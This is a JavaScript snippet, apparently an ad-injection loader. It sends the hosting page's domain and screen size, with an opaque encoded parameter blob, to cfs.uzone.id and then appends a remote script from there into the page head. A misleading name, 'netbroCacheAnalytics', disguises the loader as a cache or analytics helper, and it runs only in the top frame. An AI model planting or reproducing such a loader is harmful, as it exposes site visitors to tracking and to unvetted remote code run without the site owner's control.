'use strict';

(function () {
  function netbroCacheAnalytics(fn, callback) {
    setTimeout(function () {
      fn();
      callback();
    }, 0);
  }

  function sync(fn) {
    fn();
  }

  function requestCfs() {
    var idcGloProtocol = (location.protocol === 'https:' ? 'https://' : 'http://');
    var idcGloRand = Math.floor(Math.random() * 99999999999);
    var url = idcGloProtocol +
      'cfs.uzone.id/cfspushadsv2/request' +
      '?id=1' +
      '&enc=telkom2' +
      '&params=' +
      '4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnS1fugU6WaAWkC0rz5iJcaLsndlJ31Pg9DYIa38Smh8cBBtq%2bB0qrqOtGSs%2fsIOkDhu4dOYRBojISWGATKMHep7TjUVs0o%2bf%2fJvmCyJ2Ba%2bi%2bK1MNBH475b24NQ82X9AmYYgKemAahmdYk%2bJsbFvsPLrwVPIIM4SWG2NmHLY0fgfV3b9nSXs2Lh%2fH335VfcPKVCmu5a9ILidYQI%2bPgbmv6EUcG9W%2f5IZQDXkYoVZD74qOo1SBmpogFey8YY2l81YGKSDtoKo%2f62Ml9QHm16198%2bl%2bmRW3ogBoo%2bGMiUIlUOqLGQyyqiYzpolGZthuh8pq4RsRz%2fAPQKVm9R8h6cLTOk6psQnbK7nrnv0WDxshM4XXXh9T%2fBjkA7pEOfuWiCZH4OsfvwOlsSSpVtR3zGzl1kQ6ONXTY5rpVJT38zhHKe1%2f8lT%2fxKjMJ9Vu0wgmLkpGEamzxp7y4P%2f1bk8nHyoo0rwiXg6lfOKDzyTliHI82TjOzRi5pKKgYA7wYbmEDi22UShFlTYlzM034%2b3RaB2G%2fGBG%2b1o465ZOVFFVw8YNIi0UVPXueSHwESQwIn%2bZ0WqCItYkFz%2b8y16c8PKOP%2bQNWOD%2bHloAcV%2bhPY0zvZOYzbceT%2brxLaL10bigbgZWEtsN' +
      '&idc_r=' +
      idcGloRand +
      '&domain=' +
      document.domain +
      '&sw=' +
      screen.width +
      '&sh='
      + screen.height;
    var bsa = document.createElement('script');
    bsa.type = 'text/javascript';
    bsa.async = true;
    bsa.src = url;
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
  }

  if (self === top) {
    netbroCacheAnalytics(requestCfs, function () {
    });
  }
})();